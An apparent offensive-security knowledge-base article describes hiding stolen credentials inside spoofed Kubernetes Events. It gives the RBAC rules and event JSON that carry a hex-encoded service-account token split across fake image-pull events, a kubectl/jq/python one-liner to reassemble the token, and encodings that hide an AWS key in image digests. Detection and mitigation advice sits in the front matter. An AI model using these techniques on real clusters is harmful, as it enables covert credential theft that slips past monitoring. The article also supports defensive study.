---
title: Data Exfiltration via Kubernetes Events
description: How attackers can misuse Kubernetes Events to move data out after cluster compromise
category: offensive
createdAt: 2026-04-08
impact: >-
  An attacker with cluster access and permission to create `events` can hide stolen data inside normal-looking event messages. Because Events are expected control-plane traffic, this can blend into noise and bypass checks that focus only on pods, secrets, and network egress.
mitigation:
  - Treat `create` on `events` as a sensitive permission. Most workloads do not need broad event-write access.
  - Alert on unusual event volume, long messages, and encoded-looking content from unexpected identities.
  - Correlate suspicious event writes with node compromise signals and unusual secret-access activity.
  - Export Events to centralized logging so short retention does not erase investigation evidence.
mitreTechniques:
  - T1537
  - T1530
tools:
  - kubectl
references: |
  - [Kubernetes Event API](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.30/#event-v1-core)
  - [Events in Kubernetes](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_events/)
---

After gaining access to a cluster, an attacker may have already collected sensitive data: a mounted service account token, a database credential from a Secret, an AWS key from an environment variable. The next step is moving that data out without triggering network egress alerts or leaving obvious traces. Kubernetes Events serve as a built-in staging area. The control plane stores and serves the events without any content inspection, and the same API access retrieves the data from any session with `get` on `events`.

## RBAC permissions

```yaml
rules:
  - apiGroups: [""]
    resources: ["events"]
    verbs: ["create", "get"]
```

## Spoofing the event source

The `source.component`, `source.host`, `reportingComponent`, and `reportingInstance` fields are set by the creator. The API server stores whatever value is submitted without validating it against the requesting identity. Setting them to `kubelet` and a real node name makes the event indistinguishable from kubelet output in `kubectl get events`.

## Exfiltrating a service account token

A service account token for `system:serviceaccount:production:deployer` is a JWT. Mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` inside any pod running with that account, it grants whatever RBAC permissions the account holds. An attacker hex-encodes the token and splits it across three events, each appearing as a routine image pull in the `production` namespace.

The token:

```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkNKYnhWVkJZbjE3dDFMQ0R3OHcwNllZRENzM0NUcHFxZ01kSEktSE85dlkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzc1OTMzMzQ3LCJpYXQiOjE3NzU5Mjk3NDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiOWNkZjA1YmItMzA1OC00MzAyLTkyMjEtZDgwNWRhZWI3Mjc5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJwcm9kdWN0aW9uIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlcGxveWVyIiwidWlkIjoiNzJhMjVhNDctNzcxNy00YmU1LWI2ZWQtZmY0ZjJiZDRjYWVlIn19LCJuYmYiOjE3NzU5Mjk3NDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpwcm9kdWN0aW9uOmRlcGxveWVyIn0.J4mVhBlzrnpfL6cTjKcP6pHHxXlK0c6zlCLVYp9w0pNIGDSMMZXD6_aRfoCQCIuSY0jCs5PSR2LcdM-_WoJENRctWuJd64YQShyYv16rWfypBEyNkEp4GTBqpOhKKaEUckPxfmTa4T8ISwvXJAf16cEsSk7B1GHLnnxC2BcWThytXirOwdY394uOei_CVdyBf-SF2yX4__t7nZZyhnLptP8jjaUFQywrbxqFExUIfft46h1fX14kaWXMA2-dZJevnyJPmyMoSFK2wNwY6RBU55Bd4Jjm3J8aiNigRt1Z-NwMUO85hV6qCCJgARscTt_Syqo07sno7bngGs8qN-m9Ag
```

Its payload decodes to:

```json
{
  "sub": "system:serviceaccount:production:deployer",
  "kubernetes.io": {
    "namespace": "production",
    "serviceaccount": { "name": "deployer", "uid": "72a25a47-7717-4be5-b6ed-ff4f2bd4caee" }
  }
}
```

Hex-encoded, the token is 1882 characters. Split into three equal chunks and stored in the `reportingInstance` field of three consecutive events:

```json
{"name": "order-service-589fc77b9d-5mxjm.18a55d4b2f000001", "reportingInstance": "65794a68624763694f694a53557a49314e694973496d74705a434936496b4e4b596e6857566b4a5a626a45336444464d513052334f4863774e6c6c5a52454e7a4d304e55634846785a30316b53456b7453453835646c6b6966512e65794a68645751694f6c73696148523063484d364c79397264574a6c636d356c6447567a4c6d526c5a6d46316248517563335a6a4c6d4e7364584e305a5849756247396a59577769585377695a586877496a6f784e7a63314f544d7a4d7a51334c434a70595851694f6a45334e7a55354d6a6b334e446373496d6c7a63794936496d68306448427a4f693876613356695a584a755a58526c6379356b5a575a68645778304c6e4e325979356a6248567a644756794c6d78765932467349697769616e5270496a6f694f574e6b5a6a4131596d49744d7a41314f4330304d7a4"}
{"name": "order-service-589fc77b9d-5mxjm.18a55d4b2f000002", "reportingInstance": "1794c546b794d6a45745a4467774e5752685a5749334d6a633549697769613356695a584a755a58526c637935706279493665794a755957316c63334268593255694f694a77636d396b64574e30615739754969776963325679646d6c6a5a57466a59323931626e51694f6e7369626d46745a534936496d526c63477876655756794969776964576c6b496a6f694e7a4a684d6a56684e4463744e7a63784e793030596d55314c5749325a5751745a6d59305a6a4a695a44526a5957566c496e31394c434a75596d59694f6a45334e7a55354d6a6b334e446373496e4e3159694936496e4e356333526c6254707a5a584a3261574e6c59574e6a6233567564447077636d396b64574e30615739754f6d526c6347787665575679496e302e4a346d5668426c7a726e70664c3663546a4b63503670484878586c4b"}
{"name": "order-service-589fc77b9d-5mxjm.18a55d4b2f000003", "reportingInstance": "3063367a6c434c565970397730704e494744534d4d5a5844365f6152666f43514349755359306a437335505352324c63644d2d5f576f4a454e52637457754a64363459515368795976313672576679704245794e6b45703447544271704f684b4b614555636b5078666d546134543849537776584a41663136634573536b37423147484c6e6e784332426357546879745869724f776459333934754f65695f4356647942662d5346327958345f5f74376e5a5a79686e4c707450386a6a61554651797772627871464578554966667434366831665831346b6157584d41322d645a4a65766e794a506d794d6f53464b32774e77593652425535354264344a6a6d334a3861694e69675274315a2d4e774d554f38356856367143434a674152736354745f5379716f3037736e6f37626e67477338714e2d6d394167"}
```

All three events show the same visible output in `kubectl get events`:

```output
LAST SEEN   TYPE     REASON   OBJECT                               MESSAGE
5m          Normal   Pulled   pod/order-service-589fc77b9d-5mxjm   Successfully pulled image "order-service:v2.4.1" in 2.103s (2.103s including waiting). Image size: 134469729 bytes.
5m          Normal   Pulled   pod/order-service-589fc77b9d-5mxjm   Successfully pulled image "order-service:v2.4.1" in 2.103s (2.103s including waiting). Image size: 134469729 bytes.
5m          Normal   Pulled   pod/order-service-589fc77b9d-5mxjm   Successfully pulled image "order-service:v2.4.1" in 2.103s (2.103s including waiting). Image size: 134469729 bytes.
```

The `reportingInstance` field is not shown. From a different session, the attacker retrieves and reassembles the token:

```bash
kubectl get events -n production --sort-by='.metadata.name' -o json \
  | jq -r '[.items[] | .reportingInstance] | join("")' \
  | python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())"
```

```output
eyJhbGciOiJSUzI1NiIsImtpZCI6IkNKYnhWVkJZbjE3dDFMQ0R3OHcwNllZRENzM0NUcHFxZ01kSEktSE85dlkifQ.eyJhdWQiOls...
```

The output is the complete service account token, ready to use.

## Other encoding channels

### A1Z26 cipher in numeric fields

Numeric fields in event messages accept arbitrary integers. The `image size` field is a common target. A1Z26 maps each letter to its position in the alphabet using two digits. The value `190503180520` encodes `SECRET`.

```
19=S  05=E  03=C  18=R  05=E  20=T
```

A1Z26 is limited to alphabetic characters. Encoding six letters produces a 12-digit image size corresponding to tens of terabytes. This is implausible for a container image. It is better suited for short string labels than for raw credential values.

### Image digest: AWS access key

The `sha256:` digest in a pinned image pull is always 64 hex characters. An attacker hex-encodes a credential and pads it to 64 characters. The AWS access key ID `AKIAIOSFODNN7EXAMPLE` encodes to:

```
414b4941494f53464f444e4e374558414d504c45000000000000000000000000
```

The event message:

```
Successfully pulled image "nginx:1.21.6@sha256:414b4941494f53464f444e4e374558414d504c45000000000000000000000000" in 1.565s (1.565s including waiting). Image size: 134469729 bytes.
```

The message format, timing, image size, and digest length all match a normal pull. The digest is syntactically valid.
